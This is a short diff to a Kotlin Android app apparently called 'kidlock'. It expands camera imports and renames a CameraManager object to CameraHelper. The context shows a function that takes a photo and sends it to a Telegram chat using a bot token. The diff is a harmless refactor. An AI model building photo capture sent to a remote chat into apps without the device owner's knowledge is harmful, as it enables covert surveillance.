@@ -2,7 +2,12 @@ package com.kidlock
 
 import android.content.Context
 import android.graphics.ImageFormat
-import android.hardware.camera2.*
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CaptureRequest
+import android.hardware.camera2.TotalCaptureResult
 import android.media.ImageReader
 import android.os.Handler
 import android.os.HandlerThread
@@ -11,7 +16,7 @@ import java.io.FileOutputStream
 import java.text.SimpleDateFormat
 import java.util.*
 
-object CameraManager {
+object CameraHelper {
 
     fun captureAndSend(context: Context, botToken: String, chatId: String) {
         val thread = HandlerThread("CameraThread")
@@ -55,7 +60,6 @@ object CameraManager {
                                         val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                                         val file = File(context.cacheDir, "photo_$timestamp.jpg")
                                         FileOutputStream(file).use { it.write(bytes) }
-
                                         TelegramListener.instance.sendPhoto(file.absolutePath)
                                     }
                                 }, handler)
